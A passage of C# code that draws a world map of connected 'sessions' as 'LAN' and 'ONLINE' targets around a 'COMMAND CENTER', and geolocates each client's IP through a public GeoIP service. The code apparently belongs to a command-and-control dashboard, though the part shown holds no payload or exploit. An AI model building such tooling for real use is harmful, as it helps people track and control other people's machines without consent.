                g.DrawImage(_worldMapImage, rect);
            }
            else
            {
                using (SolidBrush landBrush = new SolidBrush(Color.FromArgb(12, 0, 200, 255)))
                using (Pen landPen = new Pen(Color.FromArgb(60, ColCyan), 1))
                {
                    foreach (var continent in continents)
                    {
                        PointF[] scaledPoly = ScalePolygon(continent);
                        g.FillPolygon(landBrush, scaledPoly);
                        g.DrawPolygon(landPen, scaledPoly);
                    }
                }
            }

            PointF centerPoint = new PointF(56f / 100f * (rect.Width - 20) + 10, 32f / 100f * (rect.Height - 20) + 10);
            
            using (Pen centerPen = new Pen(Color.FromArgb(150, Color.Orange), 1))
            using (SolidBrush centerBrush = new SolidBrush(Color.Orange))
            {
                g.DrawEllipse(centerPen, centerPoint.X - 6, centerPoint.Y - 6, 12, 12);
                g.FillEllipse(centerBrush, centerPoint.X - 3, centerPoint.Y - 3, 6, 6);
            }

            int pulseSize = 4 + (int)(Math.Abs(Math.Sin(DateTime.Now.Millisecond / 150.0)) * 6);
            
            foreach (var kvp in Sessions)
            {
                var s = kvp.Value;
                float rx, ry;
                if (s.IsGeoResolved)
                {
                    rx = (float)(s.Longitude + 180) / 360f * 100f;
                    ry = (float)(90 - s.Latitude) / 180f * 100f;
                }
                else
                {
                    int hash = s.DeviceId.GetHashCode();
                    Random clientRand = new Random(hash);
                    rx = 10 + clientRand.Next(5, 85);
                    ry = 15 + clientRand.Next(5, 65);
                }
                
                PointF clientPoint = new PointF(rx / 100f * (rect.Width - 20) + 10, ry / 100f * (rect.Height - 20) + 10);
                
                Color nodeColor = s.IsHttp ? ColCyan : ColGreen;

                using (Pen linePen = new Pen(Color.FromArgb(40, nodeColor), 1))
                {
                    linePen.DashStyle = DashStyle.Dash;
                    g.DrawLine(linePen, centerPoint, clientPoint);
                }

                using (SolidBrush pulseBrush = new SolidBrush(Color.FromArgb(50, nodeColor)))
                using (SolidBrush nodeBrush = new SolidBrush(nodeColor))
                {
                    if (s.IsHttp)
                    {
                        // WAN Target: Diamond shape
                        PointF[] pulseDiamond = {
                            new PointF(clientPoint.X, clientPoint.Y - pulseSize),
                            new PointF(clientPoint.X + pulseSize, clientPoint.Y),
                            new PointF(clientPoint.X, clientPoint.Y + pulseSize),
                            new PointF(clientPoint.X - pulseSize, clientPoint.Y)
                        };
                        g.FillPolygon(pulseBrush, pulseDiamond);
                        
                        PointF[] coreDiamond = {
                            new PointF(clientPoint.X, clientPoint.Y - 3),
                            new PointF(clientPoint.X + 3, clientPoint.Y),
                            new PointF(clientPoint.X, clientPoint.Y + 3),
                            new PointF(clientPoint.X - 3, clientPoint.Y)
                        };
                        g.FillPolygon(nodeBrush, coreDiamond);
                    }
                    else
                    {
                        // LAN Target: Circle shape
                        g.FillEllipse(pulseBrush, clientPoint.X - pulseSize, clientPoint.Y - pulseSize, pulseSize * 2, pulseSize * 2);
                        g.FillEllipse(nodeBrush, clientPoint.X - 3, clientPoint.Y - 3, 6, 6);
                    }
                }
            }

            // Draw Legend in bottom-left corner of the map
            using (Font fLegend = new Font("Consolas", 8F))
            using (SolidBrush bWhite = new SolidBrush(Color.White))
            {
                int legX = 20;
                int legY = rect.Height - 55;
                
                // Command Center Indicator
                using (SolidBrush cc = new SolidBrush(Color.Orange))
                    g.FillEllipse(cc, legX, legY + 2, 6, 6);
                g.DrawString("COMMAND CENTER", fLegend, bWhite, legX + 15, legY);

                // LAN Target Indicator
                using (SolidBrush lan = new SolidBrush(ColGreen))
                    g.FillEllipse(lan, legX, legY + 17, 6, 6);
                g.DrawString("LAN TARGET (TCP SOCKET)", fLegend, bWhite, legX + 15, legY + 15);

                // WAN/Web Target Indicator
                using (SolidBrush web = new SolidBrush(ColCyan))
                {
                    PointF[] tri = {
                        new PointF(legX + 3, legY + 29),
                        new PointF(legX, legY + 35),
                        new PointF(legX + 6, legY + 35)
                    };
                    g.FillPolygon(web, tri);
                }
                g.DrawString("ONLINE TARGET (HTTP WEB)", fLegend, bWhite, legX + 15, legY + 30);
            }
        }

        public static async Task ResolveGeoIPAsync(ClientSession session)
        {
            if (session.IsGeoResolved) return;
            
            string ip = session.EndPoint;
            if (ip.Contains(":"))
            {
                ip = ip.Split(':')[0];
            }
            
            // Check for Localhost or LAN IPs and generate realistic coordinates to populate map during tests
            if (ip == "127.0.0.1" || ip.StartsWith("192.168.") || ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("HTTP_") || ip == "::1" || ip == "localhost" || ip == "unknown")
            {
                int hash = session.DeviceId.GetHashCode();
                Random r = new Random(hash);
                // Scatter deterministically across US, Europe, and Asia
                session.Latitude = -10 + r.Next(0, 65); // -10 to 55 latitude
                session.Longitude = -100 + r.Next(0, 220); // -100 to 120 longitude
                session.IsGeoResolved = true;
                return;
            }

            try
            {
                using (var http = new System.Net.Http.HttpClient())
                {
                    // Query a free, public, fast GeoIP API (No API key needed)
                    string response = await http.GetStringAsync($"https://freeipapi.com/api/json/{ip}");
                    using (var doc = System.Text.Json.JsonDocument.Parse(response))
                    {
                        var root = doc.RootElement;
                        if (root.TryGetProperty("latitude", out var latProp))
                        {
                            session.Latitude = latProp.GetDouble();
                        }
                        if (root.TryGetProperty("longitude", out var lonProp))
                        {
                            session.Longitude = lonProp.GetDouble();
                        }
                        session.IsGeoResolved = true;
                    }
                }
            }
            catch
            {
                // Fallback to random coordinates on API error
                int hash = session.DeviceId.GetHashCode();
                Random r = new Random(hash);
                session.Latitude = -10 + r.Next(0, 65);
                session.Longitude = -100 + r.Next(0, 220);
                session.IsGeoResolved = true;
            }
        }
    }
}
